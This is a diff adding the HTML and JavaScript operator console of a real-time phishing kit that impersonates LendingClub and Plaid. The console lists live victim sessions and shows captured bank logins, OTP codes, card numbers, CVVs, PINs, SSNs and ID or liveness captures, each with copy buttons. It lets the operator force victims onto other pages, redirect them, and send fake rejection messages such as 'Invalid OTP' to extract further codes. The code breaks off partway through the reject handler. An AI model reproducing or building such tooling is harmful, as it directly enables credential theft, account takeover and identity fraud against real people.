@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LC Admin — Live Panel</title>
+<link rel="icon" href="data:,">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0a0c10;--s1:#111318;--s2:#181c24;--s3:#1f2530;--b1:#2a303d;--b2:#363e50;--t1:#e4e8f0;--t2:#8b94a8;--t3:#555e72;--ac:#4f8ef7;--ac2:#3b6fd4;--gn:#22c55e;--gn2:#166534;--rd:#ef4444;--rd2:#7f1d1d;--or:#f59e0b;--or2:#78350f;--cy:#22d3ee;--pu:#a78bfa;--mono:'SF Mono',SFMono-Regular,Consolas,'Courier New',monospace;--sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;--r:8px;--sh:0 4px 20px rgba(0,0,0,.4)}
+html,body{height:100%;font-family:var(--sans);background:var(--bg);color:var(--t1);overflow:hidden;font-size:13px;line-height:1.5}
+
+/* ── LOGIN ── */
+#loginScreen{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:9999}
+#loginScreen.hidden{display:none}
+.login-card{background:var(--s1);border:1px solid var(--b1);border-radius:14px;padding:44px 38px;width:370px;box-shadow:var(--sh)}
+.login-card h2{font-size:20px;font-weight:700;margin-bottom:6px}
+.login-card p{color:var(--t2);font-size:12px;margin-bottom:24px}
+.lf{margin-bottom:14px}
+.lf label{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t2);margin-bottom:6px}
+.lf input{width:100%;padding:10px 13px;background:var(--s2);border:1px solid var(--b1);border-radius:var(--r);color:var(--t1);font-family:var(--mono);font-size:13px;outline:none}
+.lf input:focus{border-color:var(--ac)}
+.login-btn{width:100%;padding:11px;background:var(--ac);border:none;border-radius:var(--r);color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:6px}
+.login-btn:hover{background:var(--ac2)}
+.login-err{color:var(--rd);font-size:11px;margin-top:8px;text-align:center;display:none}
+.login-err.show{display:block}
+
+/* ── TOPBAR ── */
+#topbar{height:46px;background:var(--s1);border-bottom:1px solid var(--b1);display:flex;align-items:center;padding:0 14px;gap:10px;flex-shrink:0}
+.tb-logo{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--t1);display:flex;align-items:center;gap:7px;white-space:nowrap}
+.tb-dot{width:20px;height:20px;border-radius:5px;background:linear-gradient(135deg,var(--ac),var(--cy));display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:800;color:#fff}
+.tb-sep{width:1px;height:22px;background:var(--b1);margin:0 2px}
+.tb-stat{font-size:11px;font-family:var(--mono);color:var(--t2);display:flex;align-items:center;gap:4px}
+.tb-stat b{color:var(--gn);font-size:12px}
+.tb-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.conn-pill{display:flex;align-items:center;gap:5px;padding:3px 9px;border-radius:16px;font-size:10px;font-weight:700;font-family:var(--mono);letter-spacing:.3px;border:1px solid var(--b1);background:var(--s2)}
+.conn-pill .cd{width:6px;height:6px;border-radius:50%;background:var(--t3)}
+.conn-pill.on .cd{background:var(--gn);animation:pulse 2s infinite}
+.conn-pill.on{border-color:var(--gn2);color:var(--gn)}
+.conn-pill.off .cd{background:var(--rd)}
+.conn-pill.off{border-color:var(--rd2);color:var(--rd)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+
+/* ── LAYOUT ── */
+#app{display:none;height:100vh;flex-direction:column}
+#app.show{display:flex}
+.main{flex:1;overflow:hidden;display:flex}
+
+/* ── LEFT: Sessions ── */
+#left{width:270px;background:var(--s1);border-right:1px solid var(--b1);display:flex;flex-direction:column;flex-shrink:0}
+.ph{padding:10px 12px;border-bottom:1px solid var(--b1);flex-shrink:0}
+.ph h3{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:6px}
+#sessionList{flex:1;overflow-y:auto;padding:6px}
+#sessionList::-webkit-scrollbar{width:3px}
+#sessionList::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
+.sc{padding:9px 10px;border:1px solid var(--b1);border-radius:var(--r);background:var(--s2);cursor:pointer;margin-bottom:5px;transition:all .15s;position:relative}
+.sc:hover{border-color:var(--b2);background:var(--s3)}
+.sc.sel{border-color:var(--ac);background:rgba(79,142,247,.07)}
+.sc.pending::after{content:'';position:absolute;top:7px;right:7px;width:6px;height:6px;border-radius:50%;background:var(--or);animation:pulse 1.5s infinite}
+.sc-name{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:160px}
+.sc-id{font-family:var(--mono);font-size:9px;color:var(--ac);font-weight:600;margin:2px 0}
+.sc-step{font-size:10px;color:var(--t2)}
+.sc-meta{display:flex;justify-content:space-between;margin-top:3px;font-size:9px;color:var(--t3)}
+.dot{width:7px;height:7px;border-radius:50%;display:inline-block;margin-right:4px}
+.dot.on{background:var(--gn);box-shadow:0 0 5px rgba(34,197,94,.4)}
+.dot.off{background:var(--t3)}
+.empty{text-align:center;padding:40px 16px;color:var(--t3);font-size:11px}
+
+/* ── CENTER: Detail ── */
+#center{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+.c-top{padding:10px 14px;border-bottom:1px solid var(--b1);background:var(--s1);flex-shrink:0;display:flex;align-items:center}
+.c-top .sel-name{font-size:13px;font-weight:600}
+.c-top .sel-meta{font-size:10px;color:var(--t2);font-family:var(--mono)}
+#centerContent{flex:1;overflow-y:auto;padding:12px}
+#centerContent::-webkit-scrollbar{width:3px}
+#centerContent::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
+.c-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;color:var(--t3);text-align:center;gap:10px}
+.c-empty i{font-size:36px;opacity:.3}
+.c-empty h3{font-size:14px;color:var(--t2)}
+
+/* ── Submission cards ── */
+.sub-card{background:var(--s1);border:1px solid var(--b1);border-radius:10px;margin-bottom:10px;overflow:hidden;animation:slideIn .25s ease}
+@keyframes slideIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
+.sub-card.pending{border-left:3px solid var(--or)}
+.sub-card.approved{border-left:3px solid var(--gn);opacity:.55}
+.sub-card.rejected{border-left:3px solid var(--rd);opacity:.55}
+.sub-h{display:flex;align-items:center;gap:8px;padding:10px 12px;border-bottom:1px solid var(--b1)}
+.sub-icon{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0}
+.sub-icon.bank{background:rgba(79,142,247,.12);color:var(--ac)}
+.sub-icon.kyc{background:rgba(167,139,250,.12);color:var(--pu)}
+.sub-icon.plaid{background:rgba(34,211,238,.12);color:var(--cy)}
+.sub-label{font-size:12px;font-weight:600;flex:1}
+.sub-badge{font-size:9px;font-weight:700;padding:2px 7px;border-radius:10px;font-family:var(--mono);text-transform:uppercase}
+.sub-badge.pending{background:var(--or2);color:var(--or)}
+.sub-badge.approved{background:var(--gn2);color:var(--gn)}
+.sub-badge.rejected{background:var(--rd2);color:var(--rd)}
+.sub-fields{padding:10px 12px}
+.sf-row{display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid rgba(42,48,61,.5);font-size:11px}
+.sf-row:last-child{border:none}
+.sf-k{width:110px;color:var(--t2);font-weight:600;text-transform:uppercase;letter-spacing:.3px;font-size:10px;flex-shrink:0}
+.sf-v{flex:1;font-family:var(--mono);font-size:11px;word-break:break-all}
+.sf-v.secret{color:var(--or);background:rgba(245,158,11,.06);padding:1px 4px;border-radius:3px}
+.sf-copy{background:none;border:none;color:var(--t3);cursor:pointer;font-size:11px;padding:2px 4px;flex-shrink:0}
+.sf-copy:hover{color:var(--ac)}
+.sub-actions{display:grid;grid-template-columns:1fr 1fr;gap:6px;padding:8px 12px;border-top:1px solid var(--b1)}
+.btn-ap{padding:8px;border:none;border-radius:var(--r);background:var(--gn);color:#fff;font-size:12px;font-weight:600;cursor:pointer}
+.btn-ap:hover{background:#16a34a}
+.btn-ap:disabled{background:var(--gn2);color:rgba(255,255,255,.35);cursor:not-allowed}
+.btn-rj{padding:8px;border:none;border-radius:var(--r);background:var(--rd);color:#fff;font-size:12px;font-weight:600;cursor:pointer}
+.btn-rj:hover{background:#dc2626}
+.btn-rj:disabled{background:var(--rd2);color:rgba(255,255,255,.35);cursor:not-allowed}
+
+/* ── RIGHT: Controls ── */
+#right{width:290px;background:var(--s1);border-left:1px solid var(--b1);overflow-y:auto;flex-shrink:0}
+#right::-webkit-scrollbar{width:3px}
+#right::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
+.rp{padding:10px 12px;border-bottom:1px solid var(--b1)}
+.rp-t{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:8px}
+.ag{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.ab{padding:7px 5px;border:1px solid var(--b1);border-radius:var(--r);background:var(--s2);color:var(--t2);font-size:10px;font-weight:600;cursor:pointer;text-align:center;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:4px}
+.ab:hover{border-color:var(--b2);color:var(--t1);background:var(--s3)}
+.ab.full{grid-column:1/-1}
+.ab.grn{background:rgba(34,197,94,.08);border-color:var(--gn2);color:var(--gn)}
+.ab.grn:hover{background:rgba(34,197,94,.16)}
+.ab.red{background:rgba(239,68,68,.08);border-color:var(--rd2);color:var(--rd)}
+.ab.red:hover{background:rgba(239,68,68,.16)}
+.ab.blu{background:rgba(79,142,247,.08);border-color:rgba(79,142,247,.25);color:var(--ac)}
+.ab.blu:hover{background:rgba(79,142,247,.16)}
+
+/* ── Radio group ── */
+.rg{display:flex;flex-direction:column;gap:4px;max-height:180px;overflow-y:auto;margin-bottom:6px}
+.rg::-webkit-scrollbar{width:3px}
+.rg::-webkit-scrollbar-thumb{background:var(--b1);border-radius:3px}
+.ri{display:flex;align-items:center;gap:6px;padding:5px 8px;border:1px solid var(--b1);border-radius:5px;cursor:pointer;font-size:10px;transition:all .12s}
+.ri:hover{border-color:var(--ac);background:rgba(79,142,247,.04)}
+.ri input[type=radio]{accent-color:var(--ac)}
+
+/* ── Form controls ── */
+.rp select,.rp input[type=text],.rp input[type=url],.rp textarea{width:100%;padding:7px 9px;background:var(--s2);border:1px solid var(--b1);border-radius:6px;color:var(--t1);font-size:12px;outline:none;font-family:var(--sans);margin-bottom:6px}
+.rp select:focus,.rp input:focus,.rp textarea:focus{border-color:var(--ac)}
+.rp textarea{resize:vertical;min-height:50px}
+.rp label.sm{font-size:9px;color:var(--t3);display:block;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px}
+.rp .check{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--t2);margin:4px 0}
+.rp .check input{accent-color:var(--ac)}
+
+/* ── Reject modal ── */
+#rejectModal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:flex;align-items:center;justify-content:center;z-index:9998;opacity:0;pointer-events:none;transition:opacity .2s;backdrop-filter:blur(3px)}
+#rejectModal.open{opacity:1;pointer-events:all}
+.rm-card{background:var(--s1);border:1px solid var(--b1);border-radius:12px;padding:22px;width:400px;box-shadow:var(--sh)}
+.rm-card h3{font-size:15px;font-weight:700;margin-bottom:4px}
+.rm-card p{font-size:11px;color:var(--t2);margin-bottom:14px}
+.rm-card select,.rm-card textarea{width:100%;padding:8px 10px;background:var(--s2);border:1px solid var(--b1);border-radius:var(--r);color:var(--t1);font-size:12px;outline:none;margin-bottom:10px}
+.rm-card textarea{resize:vertical;min-height:60px}
+.rm-actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:6px}
+.rm-cancel{padding:9px;border:1px solid var(--b1);border-radius:var(--r);background:transparent;color:var(--t2);cursor:pointer;font-size:12px;font-weight:600}
+.rm-send{padding:9px;border:none;border-radius:var(--r);background:var(--rd);color:#fff;cursor:pointer;font-size:12px;font-weight:600}
+
+/* ── Toast ── */
+#toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);padding:9px 18px;border-radius:8px;font-size:12px;font-weight:500;color:#fff;pointer-events:none;opacity:0;transition:opacity .25s;z-index:99999;white-space:nowrap;box-shadow:var(--sh)}
+#toast.show{opacity:1}
+#toast.ok{background:var(--gn2);border:1px solid var(--gn)}
+#toast.err{background:var(--rd2);border:1px solid var(--rd)}
+#toast.info{background:#1e3a5f;border:1px solid var(--ac)}
+#toast.warn{background:var(--or2);border:1px solid var(--or)}
+
+@media(max-width:900px){#left{width:220px}#right{width:250px}}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="loginScreen">
+<div class="login-card">
+  <h2>Admin Panel</h2>
+  <p>LendingClub Contract Portal — Live Control</p>
+  <div class="lf"><label>Admin Secret Key</label><input id="lKey" type="password" placeholder="••••••••••••"></div>
+  <button class="login-btn" onclick="doLogin()">Access Panel</button>
+  <div class="login-err" id="lErr">Invalid credentials</div>
+</div>
+</div>
+
+<!-- APP -->
+<div id="app">
+<div id="topbar">
+  <div class="tb-logo"><div class="tb-dot">LC</div>Admin Panel</div>
+  <div class="tb-sep"></div>
+  <div class="tb-stat">Sessions: <b id="cTotal">0</b></div>
+  <div class="tb-stat">Online: <b id="cOnline">0</b></div>
+  <div class="tb-right">
+    <div class="conn-pill off" id="connPill"><div class="cd"></div><span id="connLbl">Offline</span></div>
+  </div>
+</div>
+<div class="main">
+
+<!-- LEFT -->
+<div id="left">
+  <div class="ph"><h3>Sessions</h3></div>
+  <div id="sessionList"><div class="empty">Waiting for sessions…</div></div>
+</div>
+
+<!-- CENTER -->
+<div id="center">
+  <div class="c-top">
+    <div><div class="sel-name" id="selName">No session selected</div><div class="sel-meta" id="selMeta">Select a session from the left</div></div>
+  </div>
+  <div id="centerContent">
+    <div class="c-empty" id="centerEmpty"><i class="fas fa-inbox"></i><h3>Select a session</h3></div>
+    <div id="subCards" style="display:none"></div>
+  </div>
+</div>
+
+<!-- RIGHT -->
+<div id="right">
+  <!-- Quick Actions -->
+  <div class="rp">
+    <div class="rp-t">Quick Actions</div>
+    <div class="ag">
+      <button class="ab grn" onclick="quickApprove()"><i class="fas fa-check"></i> Approve</button>
+      <button class="ab red" onclick="openReject()"><i class="fas fa-times"></i> Reject</button>
+      <button class="ab" onclick="sendCmd('admin_lock_session')"><i class="fas fa-lock"></i> Lock</button>
+      <button class="ab" onclick="sendCmd('admin_unlock_session')"><i class="fas fa-lock-open"></i> Unlock</button>
+      <button class="ab" id="loaderBtn" onclick="toggleLoader()"><i class="fas fa-circle-notch"></i> Show Loader</button>
+      <button class="ab" onclick="sendCmd('admin_request_upload',{prompt:'Please upload your document.'})"><i class="fas fa-paperclip"></i> Req Upload</button>
+      <button class="ab blu full" onclick="wsSend({type:'admin_refresh_sessions'})"><i class="fas fa-sync-alt"></i> Refresh</button>
+    </div>
+  </div>
+
+  <!-- Force Navigate -->
+  <div class="rp">
+    <div class="rp-t">Force Navigate</div>
+    <div class="rg" id="navRadios"></div>
+    <button class="ab blu full" onclick="forceNav()"><i class="fas fa-arrow-right"></i> Push Layout →</button>
+  </div>
+
+  <!-- Force Modal -->
+  <div class="rp">
+    <div class="rp-t">Push Modal</div>
+    <label class="sm">Title</label>
+    <input type="text" id="mTitle" placeholder="Notice" value="Important Notice">
+    <label class="sm">Message</label>
+    <textarea id="mBody" rows="2" placeholder="Message to client…"></textarea>
+    <div class="check"><input type="checkbox" id="mClose" checked> Client can close</div>
+    <button class="ab full" onclick="pushModal()"><i class="fas fa-comment-alt"></i> Push Modal →</button>
+  </div>
+
+  <!-- Redirect to URL -->
+  <div class="rp">
+    <div class="rp-t">Redirect to URL</div>
+    <label class="sm">Destination URL</label>
+    <input type="url" id="rUrl" placeholder="https://example.com/page">
+    <label class="sm">Message (shown before redirect)</label>
+    <input type="text" id="rMsg" placeholder="Redirecting you…" value="You are being redirected to complete verification.">
+    <button class="ab red full" onclick="pushRedirect()"><i class="fas fa-external-link-alt"></i> Redirect Client →</button>
+  </div>
+
+  <!-- Send Toast -->
+  <div class="rp">
+    <div class="rp-t">Send Toast</div>
+    <div class="ag">
+      <button class="ab" onclick="sendToast('info','Verification in progress…')"><i class="fas fa-info-circle"></i> Info</button>
+      <button class="ab grn" onclick="sendToast('success','Step verified!')"><i class="fas fa-check-circle"></i> Success</button>
+      <button class="ab red" onclick="sendToast('error','Please retry.')"><i class="fas fa-exclamation-circle"></i> Error</button>
+      <button class="ab" onclick="sendToast('warning','Action required.')"><i class="fas fa-exclamation-triangle"></i> Warning</button>
+    </div>
+  </div>
+
+  <!-- Session Info -->
+  <div class="rp" id="infoSection" style="display:none">
+    <div class="rp-t">Session Info</div>
+    <div id="infoContent"></div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- REJECT MODAL -->
+<div id="rejectModal">
+<div class="rm-card">
+  <h3>✗ Reject Submission</h3>
+  <p id="rmMeta">Send rejection reason to client</p>
+  <select id="rmPreset" onchange="applyPreset()">
+    <option value="">— Select preset —</option>
+    <option value="Incorrect Account Number">Wrong Account Number</option>
+    <option value="SSN Does Not Match Our Records">Wrong SSN</option>
+    <option value="Incorrect Username or Password">Wrong Credentials</option>
+    <option value="Invalid OTP — Please Request a New Code">Wrong OTP</option>
+    <option value="Card Number Does Not Match">Wrong Card Number</option>
+    <option value="Invalid CVV">Wrong CVV</option>
+    <option value="Incorrect PIN">Wrong PIN</option>
+    <option value="ID Document Not Clear — Please Retake">Blurry Document</option>
+    <option value="Face Not Visible — Please Re-record">Face Not Visible</option>
+    <option value="custom">Custom…</option>
+  </select>
+  <textarea id="rmReason" placeholder="Reason shown to client…"></textarea>
+  <div class="rm-actions">
+    <button class="rm-cancel" onclick="closeReject()">Cancel</button>
+    <button class="rm-send" onclick="submitReject()">Send Rejection</button>
+  </div>
+</div>
+</div>
+
+<!-- TOAST -->
+<div id="toast"></div>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<script>
+(function(){
+'use strict';
+
+// ── State ──
+let BACKEND = '';
+let KEY     = '';
+let ws      = null;
+let sessions   = {};   // sessionId → obj
+let selectedId = null;
+let _loaderOn  = false;
+let _rejectStep = null;
+let _rejectSid  = null;
+let _livePayloads = {};  // submissionId → raw credential payload from WS
+
+// ── Step labels ──
+const STEP_LABELS = {
+  bank_details:'Bank Details', kyc_front_dl:'KYC — Front ID', kyc_back_dl:'KYC — Back ID',
+  kyc_selfie_front_dl:'KYC — Selfie+Front', kyc_selfie_back_dl:'KYC — Selfie+Back',
+  plaid_bank_login:'Bank Login', plaid_otp:'OTP Code', plaid_card_details:'Card Details',
+  plaid_video_liveness_front:'Liveness — Front', plaid_video_liveness_back:'Liveness — Back',
+};
+const STEP_ICONS = {
+  bank_details:'bank', kyc_front_dl:'kyc', kyc_back_dl:'kyc',
+  kyc_selfie_front_dl:'kyc', kyc_selfie_back_dl:'kyc',
+  plaid_bank_login:'plaid', plaid_otp:'plaid', plaid_card_details:'plaid',
+  plaid_video_liveness_front:'kyc', plaid_video_liveness_back:'kyc',
+};
+
+// ── Nav targets ──
+const NAV_TARGETS = [
+  {id:'idx', label:'Landing (Index)', page:'INDEX'},
+  {id:'p2a', label:'Terms & Conditions', page:'CONTRACT', screen:'formA'},
+  {id:'p2b', label:'Bank Details', page:'CONTRACT', screen:'formB'},
+  {id:'p2c', label:'KYC Verification', page:'CONTRACT', screen:'formC'},
+  {id:'p3i', label:'Plaid — Intro', page:'PLAID', screen:'initial'},
+  {id:'p3b', label:'Plaid — Bank Select', page:'PLAID', screen:'bankSelection'},
+  {id:'p3l', label:'Plaid — Login', page:'PLAID', screen:'login'},
+  {id:'p3o', label:'Plaid — OTP', page:'PLAID', screen:'otp'},
+  {id:'p3c', label:'Plaid — Card Details', page:'PLAID', screen:'securityCard'},
+  {id:'p3v', label:'Plaid — Liveness', page:'PLAID', screen:'videoLiveness'},
+  {id:'p4',  label:'Success', page:'SUCCESS'},
+];
+
+// Build nav radios
+document.getElementById('navRadios').innerHTML = NAV_TARGETS.map(t =>
+  `<label class="ri"><input type="radio" name="nav" value="${t.id}" data-page="${t.page}" data-screen="${t.screen||''}"> ${t.label}</label>`
+).join('');
+
+// ════════════════════════════════════════════
+//  LOGIN
+// ════════════════════════════════════════════
+function doLogin(){
+  const key = document.getElementById('lKey').value.trim();
+  if(!key){showLoginErr('Enter admin key');return;}
+  BACKEND=window.location.origin; KEY=key;
+  fetch(`${BACKEND}/admin/key-check`,{headers:{'Authorization':`Bearer ${KEY}`}})
+  .then(r=>r.json()).then(d=>{
+    if(!d.match){showLoginErr('Wrong admin key');return;}
+    localStorage.setItem('lc_key',KEY);
+    document.getElementById('loginScreen').classList.add('hidden');
+    document.getElementById('app').classList.add('show');
+    initDashboard();
+  }).catch(()=>showLoginErr('Cannot reach backend'));
+}
+window.doLogin=doLogin;
+
+function showLoginErr(m){const e=document.getElementById('lErr');e.textContent=m;e.classList.add('show');setTimeout(()=>e.classList.remove('show'),4000);}
+
+// Auto-login
+window.addEventListener('load',()=>{
+  const k=localStorage.getItem('lc_key');
+  if(k)document.getElementById('lKey').value=k;
+  document.getElementById('lKey').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
+  if(k){BACKEND=window.location.origin;KEY=k;
+    fetch(`${BACKEND}/admin/key-check`,{headers:{'Authorization':`Bearer ${KEY}`}})
+    .then(r=>r.json()).then(d=>{
+      if(!d.match){localStorage.removeItem('lc_key');return;}
+      document.getElementById('loginScreen').classList.add('hidden');
+      document.getElementById('app').classList.add('show');
+      initDashboard();
+    }).catch(()=>{});
+  }
+});
+
+// ════════════════════════════════════════════
+//  WEBSOCKET
+// ════════════════════════════════════════════
+function connectWS(){
+  const wsUrl = BACKEND.replace(/^http/,'ws') + `/ws/admin?token=${encodeURIComponent(KEY)}`;
+  ws = new WebSocket(wsUrl);
+  ws.onopen=()=>{setConn('on');toast('Connected','ok');};
+  ws.onclose=()=>{setConn('off');setTimeout(connectWS,3000);};
+  ws.onmessage=e=>{try{handleMsg(JSON.parse(e.data));}catch{}};
+}
+
+function wsSend(msg){if(ws&&ws.readyState===1)ws.send(JSON.stringify(msg));}
+window.wsSend=wsSend;
+
+function setConn(s){
+  const p=document.getElementById('connPill'),l=document.getElementById('connLbl');
+  p.className='conn-pill '+(s==='on'?'on':'off');
+  l.textContent=s==='on'?'Live':'Reconnecting…';
+}
+
+function handleMsg(msg){
+  switch(msg.type){
+    case 'session_list':
+      sessions={};
+      (msg.sessions||[]).forEach(s=>{sessions[s.session_id]=s;});
+      render();
+      break;
+    case 'session_update': case 'heartbeat': case 'step_change':
+      if(msg.sessionId&&sessions[msg.sessionId]){
+        if(msg.route) sessions[msg.sessionId].current_page=msg.route;
+        if(msg.step) sessions[msg.sessionId].current_step=msg.step;
+        sessions[msg.sessionId]._wsLive=true;
+      }
+      render();
+      break;
+    case 'new_submission':
+      toast(`📥 ${STEP_LABELS[msg.stepType]||msg.stepType} — ${msg.clientName||''}`.trim(),'info',5000);
+      // Cache raw credential payload for display (not persisted — WS only)
+      if(msg.submissionId&&msg.payload){
+        _livePayloads[msg.submissionId]=msg.payload;
+      }
+      // Also cache by session+step for submissions without ID yet
+      if(msg.sessionId&&msg.stepType&&msg.payload){
+        _livePayloads[`${msg.sessionId}:${msg.stepType}`]=msg.payload;
+      }
+      if(msg.sessionId===selectedId)loadDetail(selectedId);
+      flashCard(msg.sessionId);
+      break;
+    case 'step_approved':
+      toast(`✅ ${STEP_LABELS[msg.stepType]||msg.stepType}`,'ok');
+      if(msg.sessionId===selectedId)loadDetail(selectedId);
+      break;
+    case 'step_rejected':
+      toast(`❌ ${STEP_LABELS[msg.stepType]||msg.stepType}`,'warn');
+      if(msg.sessionId===selectedId)loadDetail(selectedId);
+      break;
+  }
+}
+
+// ════════════════════════════════════════════
+//  INIT
+// ════════════════════════════════════════════
+async function initDashboard(){
+  connectWS();
+  setInterval(()=>{if(ws&&ws.readyState===1)wsSend({type:'admin_refresh_sessions'});},30000);
+}
+
+// ════════════════════════════════════════════
+//  RENDER
+// ════════════════════════════════════════════
+function render(){
+  const list=document.getElementById('sessionList');
+  const all=Object.values(sessions).filter(s=>s.client_name||s.application_id);
+  document.getElementById('cTotal').textContent=all.length;
+  document.getElementById('cOnline').textContent=all.filter(s=>s._wsLive).length;
+
+  if(!all.length){list.innerHTML='<div class="empty">No sessions yet</div>';return;}
+  all.sort((a,b)=>(b._wsLive?1:0)-(a._wsLive?1:0) || (b.last_heartbeat||'').localeCompare(a.last_heartbeat||''));
+
+  list.innerHTML=all.map(s=>{
+    const on=s._wsLive;
+    const sel=s.session_id===selectedId;
+    const pend=s.current_step&&s.current_step.includes('pending');
+    return `<div class="sc${sel?' sel':''}${pend?' pending':''}" onclick="selectSession('${s.session_id}')">
+      <div style="display:flex;align-items:center;gap:5px"><span class="dot ${on?'on':'off'}"></span><span class="sc-name">${esc(s.client_name||(s.applications&&s.applications.client_name)||'Unknown')}</span></div>
+      <div class="sc-id">${esc(s.application_id||'—')}</div>
+      <div class="sc-step">${esc(s.current_page||'—')} ${s.current_step?'› '+s.current_step:''}</div>
+      <div class="sc-meta"><span>${timeAgo(s.last_heartbeat)}</span></div>
+    </div>`;
+  }).join('');
+}
+
+// ════════════════════════════════════════════
+//  SELECT SESSION
+// ════════════════════════════════════════════
+window.selectSession=async function(sid){
+  selectedId=sid;
+  _loaderOn=false;
+  const lb=document.getElementById('loaderBtn');
+  if(lb){lb.innerHTML='<i class="fas fa-circle-notch"></i> Show Loader';}
+  render();
+  await loadDetail(sid);
+};
+
+async function loadDetail(sid){
+  try{
+    const r=await apiFetch(`/admin/session/${sid}`);
+    const s=r.session||{};
+    const subs=r.submissions||[];
+    const app=s.applications||{};
+
+    document.getElementById('selName').textContent=app.client_name||s.client_name||'Unknown';
+    document.getElementById('selMeta').textContent=`${s.application_id||'—'} · ${s.current_page||'—'} · ${sid.slice(0,8)}…`;
+
+    // Render submissions
+    const empty=document.getElementById('centerEmpty');
+    const cards=document.getElementById('subCards');
+    if(!subs.length){empty.style.display='flex';cards.style.display='none';return;}
+    empty.style.display='none';cards.style.display='block';
+
+    const sorted=[...subs].sort((a,b)=>{
+      const o={pending_review:0,rejected:1,approved:2};
+      return (o[a.status]||0)-(o[b.status]||0);
+    });
+    cards.innerHTML=sorted.map(sub=>buildSubCard(sub)).join('');
+
+    // Session info
+    const infoSec=document.getElementById('infoSection');
+    const infoCon=document.getElementById('infoContent');
+    infoSec.style.display='block';
+    const rows=[
+      ['Client',app.client_name||'—'],['App ID',s.application_id||'—'],
+      ['Loan',app.loan_amount?`$${Number(app.loan_amount).toLocaleString()}`:'—'],
+      ['Page',`${s.current_page||'—'} › ${s.current_step||'—'}`],
+      ['Channel',s.connection_channel||'—'],
+      ['Redis HB',r.redis?.heartbeat_live?'🟢 Live':'🔴 Stale'],
+      ['Salt',r.redis?.salt_exists?'✓ Present':'✗ Missing'],
+    ];
+    infoCon.innerHTML=rows.map(([k,v])=>`<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--b1);font-size:11px"><span style="color:var(--t2)">${k}</span><span style="font-family:var(--mono);font-size:10px;max-width:140px;word-break:break-all;text-align:right">${v}</span></div>`).join('');
+  }catch(e){toast('Load failed: '+e.message,'err');}
+}
+
+function buildSubCard(sub){
+  const st=sub.status||'pending_review';
+  const isPend=st==='pending_review';
+  const lbl=STEP_LABELS[sub.step_type]||sub.step_type;
+  const ic=STEP_ICONS[sub.step_type]||'bank';
+  const badge=st==='pending_review'?'pending':st;
+
+  let fields='';
+  // Merge: prefer live raw payload (from WS) over safe payload (from Supabase)
+  const liveP = _livePayloads[sub.id] || _livePayloads[`${sub.session_id}:${sub.step_type}`] || null;
+  const displayPayload = liveP ? { ...sub.payload, ...liveP } : (sub.payload || {});
+
+  if(displayPayload&&Object.keys(displayPayload).length){
+    fields='<div class="sub-fields">'+Object.entries(displayPayload).map(([k,v])=>{
+      if(v===null||v===undefined||v==='')return '';
+      const fid='f'+Math.random().toString(36).slice(2,6);
+      const isSecret = /ssn|password|pin|cvv|card_number|account_number|otp/i.test(k);
+      return `<div class="sf-row"><div class="sf-k">${k.replace(/_/g,' ')}</div><div class="sf-v${isSecret?' secret':''}" id="${fid}">${esc(String(v||''))}</div><button class="sf-copy" onclick="copyF('${fid}')"><i class="fas fa-copy"></i></button></div>`;
+    }).filter(Boolean).join('')+'</div>';
+  }
+
+  return `<div class="sub-card ${badge}">
+    <div class="sub-h"><div class="sub-icon ${ic}">${ic==='bank'?'🏦':ic==='kyc'?'🪪':'🔐'}</div><div class="sub-label">${lbl}</div><span class="sub-badge ${badge}">${badge}</span></div>
+    ${fields}
+    <div class="sub-actions">
+      <button class="btn-ap" onclick="approveStep('${sub.session_id}','${sub.step_type}')" ${!isPend?'disabled':''}>✓ Approve</button>
+      <button class="btn-rj" onclick="openReject('${sub.session_id}','${sub.step_type}')" ${!isPend?'disabled':''}>✗ Reject</button>
+    </div>
+  </div>`;
+}
+
+// ════════════════════════════════════════════
+//  ACTIONS
+// ════════════════════════════════════════════
+window.approveStep=function(sid,stepType){
+  wsSend({type:'admin_approve_step',sessionId:sid,stepType});
+  toast(`Approving ${STEP_LABELS[stepType]||stepType}…`,'ok');
+};
+
+window.quickApprove=function(){
+  if(!selectedId){toast('Select a session','warn');return;}
+  // Find first pending submission
+  const cards=document.querySelectorAll('.sub-card.pending .btn-ap:not(:disabled)');
+  if(cards.length)cards[0].click();
+  else toast('No pending submissions','info');
+};
+
+window.openReject=function(sid,stepType){
